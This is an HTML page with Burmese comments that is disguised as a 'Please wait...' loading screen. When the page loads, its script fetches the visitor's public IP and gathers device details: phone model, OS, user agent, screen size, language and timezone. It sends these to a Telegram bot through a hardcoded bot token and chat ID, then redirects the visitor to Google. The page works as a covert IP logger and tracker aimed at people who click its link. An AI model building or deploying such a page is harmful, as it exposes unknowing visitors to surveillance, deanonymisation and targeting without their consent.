<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f4f4f4;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0088cc;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status {
            margin-top: 20px;
            font-size: 16px;
            color: #555;
        }
    </style>
</head>
<body>

<h1>Please wait...</h1>
<div class="loader"></div>
<div id="status">Processing, please wait...</div>

<script>
    // ========== သင့် Telegram Bot အချက်အလက် ==========
    const BOT_TOKEN = '8726782078:AAFkKk2nZG3g8bhMg7exEQaaVapXS5nyWpE';
    const CHAT_ID = '8712941985';
    // ================================================

    const statusDiv = document.getElementById('status');

    // Function to get Public IP Address
    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('IP fetch error:', error);
            return 'Unable to get IP';
        }
    }

    // Function to get detailed device info
    function getDeviceInfo() {
        const userAgent = navigator.userAgent;
        let deviceType = 'Unknown';
        
        if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(userAgent)) {
            if (/iPhone|iPad|iPod/i.test(userAgent)) deviceType = 'iPhone/iPad';
            else if (/Android/i.test(userAgent)) deviceType = 'Android Phone';
            else deviceType = 'Mobile Device';
        } else if (/Tablet|iPad/i.test(userAgent)) {
            deviceType = 'Tablet';
        } else {
            deviceType = 'Desktop Computer';
        }

        let os = 'Unknown';
        if (/Android/i.test(userAgent)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(userAgent)) os = 'iOS';
        else if (/Windows NT 10.0/i.test(userAgent)) os = 'Windows 10';
        else if (/Windows NT 11.0/i.test(userAgent)) os = 'Windows 11';
        else if (/Windows/i.test(userAgent)) os = 'Windows';
        else if (/Mac OS X/i.test(userAgent)) os = 'MacOS';
        else if (/Linux/i.test(userAgent)) os = 'Linux';

        // Phone model extraction (Android only - rough estimate)
        let phoneModel = 'Unknown Model';
        if (/Android/i.test(userAgent)) {
            const modelMatch = userAgent.match(/; (.+?) Build/);
            if (modelMatch && modelMatch[1]) {
                phoneModel = modelMatch[1];
            }
        } else if (/iPhone/i.test(userAgent)) {
            const versionMatch = userAgent.match(/iPhone OS (\d+_\d+)/);
            if (versionMatch) {
                phoneModel = `iPhone (iOS ${versionMatch[1].replace('_', '.')})`;
            } else {
                phoneModel = 'iPhone';
            }
        }

        return {
            userAgent: userAgent,
            deviceType: deviceType,
            operatingSystem: os,
            phoneModel: phoneModel,
            screenResolution: `${screen.width} x ${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    // Function to send to Telegram
    async function sendToTelegram(ip, deviceInfo) {
        const currentTime = new Date().toLocaleString('en-GB', { timeZone: deviceInfo.timezone });
        
        const message = `📱 *PHONE VISITOR DETECTED* 📱
        
━━━━━━━━━━━━━━━━━━━━
🌐 *IP Address:* \`${ip}\`
📌 *Device Type:* ${deviceInfo.deviceType}
📱 *Phone/Model:* ${deviceInfo.phoneModel}
🤖 *OS:* ${deviceInfo.operatingSystem}
🌍 *Browser/UA Info:* ${deviceInfo.userAgent.substring(0, 150)}...
📏 *Screen:* ${deviceInfo.screenResolution}
🗣 *Language:* ${deviceInfo.language}
🌍 *Platform:* ${deviceInfo.platform}
⏰ *Time (Visitor):* ${currentTime}
━━━━━━━━━━━━━━━━━━━━`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            const result = await response.json();
            if (result.ok) {
                statusDiv.innerHTML = '✅ Information sent! Redirecting...';
                statusDiv.style.color = 'green';
                return true;
            } else {
                throw new Error(result.description);
            }
        } catch (error) {
            console.error('Telegram error:', error);
            statusDiv.innerHTML = '❌ Failed. Retrying...';
            statusDiv.style.color = 'red';
            return false;
        }
    }

    // ========== MAIN - လင့်ကလစ်တာနဲ့ ချက်ချင်းအလုပ်လုပ် ==========
    (async function() {
        statusDiv.innerHTML = '📡 Getting IP address...';
        
        // Get IP
        const ip = await getIPAddress();
        
        statusDiv.innerHTML = '📱 Getting device info...';
        
        // Get Device Info
        const deviceInfo = getDeviceInfo();
        
        statusDiv.innerHTML = '📤 Sending to Telegram...';
        
        // Send to Telegram
        await sendToTelegram(ip, deviceInfo);
        
        // ပို့ပြီးရင် သတ်မှတ်ထားတဲ့ နေရာကို ပြန်ရွှေ့မယ်
        setTimeout(() => {
            // ဒီနေရာမှာ ခင်ဗျား ပြန်ရွှေ့ချင်တဲ့ လင့်ကို ထည့်ပါ
            window.location.href = 'https://www.google.com';
        }, 2000);
    })();
</script>

</body>
</html>
